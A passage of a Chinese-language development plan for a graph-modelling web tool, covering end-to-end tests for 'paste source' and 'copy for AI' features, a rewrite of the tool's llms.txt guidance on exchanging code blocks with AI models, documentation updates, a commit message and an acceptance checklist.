  check('围栏与 sa-edit 标记被剥离', !r.src.includes('```') && !r.src.includes('sa-edit'), r.src.slice(0, 60))
  check('实例载入且属性正确', r.count === 1 && r.v === 7, r)
}

console.log('\n测试 50：ADR-009 菜单入口与复制文本格式')
{
  const menu = await page.evaluate(() => ({
    paste: !!document.querySelector('[onclick="pasteSource()"]'),
    copyAI: !!document.querySelector('[onclick="copyForAI()"]'),
  }))
  check('菜单含"粘贴源码…"', menu.paste, menu)
  check('菜单含"复制给 AI"', menu.copyAI, menu)
  const text = await page.evaluate(() => window.__sa_test.buildAICopyText(window.state.sourceCode, 42))
  check('复制文本 = 标记首行 + 围栏', text.startsWith('```js\n// sa-edit: 42\n') && text.trimEnd().endsWith('```'), text.slice(0, 40))
}
```

- [ ] **Step 2: 构建 + e2e**

Run: `npm run build; if ($?) { node scripts/test-e2e.mjs }`
Expected: `总计: 196 通过, 0 失败`(190 + 6)

### Task 10: llms.txt 重写 + 文档同步

**Files:**
- Modify: `src/llms.txt`(重写"你该怎么用"+ URL 段降级)
- Modify: `README.md` / `CLAUDE.md` / `docs/architecture.md` / `CHANGELOG.md`

- [ ] **Step 1: 重写 llms.txt 关键段**

`src/llms.txt` 的"## 你该怎么用这个工具"到"## URL 编码"之间改为(其余段落保留):

```markdown
## 你该怎么用这个工具

当用户聊到"某个系统是怎样运作的""帮我画个 X 的关系图""模拟一下 Y 的演化"这类需求时:

1. **按下文 sourceCode 格式构造 graph**(3 个 class field + 实例级 edges,可带 transform 公式)
2. **默认输出一段 sourceCode 代码块**(围栏 ```js)——用户会粘贴进工具的"文件 → 粘贴源码…"导入
3. **（可选快路径）** 如果图很小(编码后 < 约 4000 字符)且你有把握,可以附一个 URL;没有把握就不要附,代码块永远可用
4. **用户可能回传一段代码块**(首行有 `// sa-edit: <时间戳>` 标记)——读代码块,并回显你基于哪个标记修改(防版本发散)

### 不要 fetch 用户给的 URL

URL 的状态在 `#` 之后,HTTP 请求不携带 fragment——fetch 只会拿到空壳。
用户贴 URL 时,直接从**消息文本**里取 `#` 后的 base64 解码;或者请用户改用"复制给 AI"按钮给代码块。

### 含方法体的图会有执行确认

含方法体/控制流的图,用户在载入时会看到一次确认弹窗(这是安全闸门,不是错误)。这是预期行为。
```

原"## URL 编码"段改为附录(标题改"## 附:URL 编码(可选快路径)"),开头加:

```markdown
> 仅在你有把握可靠编码、且图较小时使用。默认请输出代码块。
```

- [ ] **Step 2: 其余文档同步**

- `README.md`:特性列表加"粘贴源码导入 / 复制给 AI(ADR-009)";快速开始提代码块通道
- `CLAUDE.md`:ADR 列表已含 008/009(Task 5 已加约束);补一条"AI 往返主通道是代码块(ADR-009)"
- `docs/architecture.md`:主流程加"复制给 AI → buildAICopyText(utils)"
- `CHANGELOG.md`:Added 加"AI 传输契约:代码块主通道 + 粘贴导入/复制给 AI + sa-edit 标记;llms.txt 重写"

- [ ] **Step 3: 构建 + 全量五套**

Run: `npm run build; if ($?) { node scripts/test-engine.mjs; node scripts/test-codegraph.mjs; node scripts/test-roundtrip.mjs; node scripts/test-skeleton.mjs; node scripts/test-e2e.mjs }`
Expected: 32 / 81 / 44 / 48 / 196 全绿。

### Task 11: 提交

- [ ] **Step 1: 提交**

```powershell
git add -A
git commit -m "feat: AI 传输契约(ADR-009)——代码块主通道,URL 降级

- 契约:llms.txt 默认输出 sourceCode 代码块;URL 降级为 <4k 快路径;
  新增'不要 fetch URL(fragment 服务器不可见)'与'执行确认是预期'说明
- 工具:'粘贴源码…'模态(自动剥围栏与 sa-edit 标记,走 importSource 闸门)
  + '复制给 AI'(标记 + 围栏代码块,state.sourceCode 不重建);modal 支持 textarea
- 工具函数:utils.stripCodeBlock / buildAICopyText(纯函数,Node 可测)
- 测试:test-roundtrip 区 9(8 项,含块内三反引号不误剥);e2e 49-50
  (粘贴导入/菜单入口/复制文本格式)
- 文档:llms.txt 重写、README、CLAUDE.md、architecture、CHANGELOG"
```

---

## 验收清单(执行完所有任务后)

- [ ] 五套测试全绿:engine 32 / codegraph 81 / roundtrip 44 / skeleton 48 / e2e 196
- [ ] `dist/index.html` 含 meta CSP;`dist/llms.txt` 为新契约
- [ ] 手动冒烟:打开 `dist/index.html` → 文件菜单有"粘贴源码…"与"复制给 AI";粘贴一段带围栏的代码块能导入;含 `tick()` 的代码导入弹确认,取消后当前图不变
- [ ] 两笔提交:`feat: 外部导入执行闸门(ADR-008)` / `feat: AI 传输契约(ADR-009)`
- [ ] 推送前跑一遍全量(用户确认后 push)
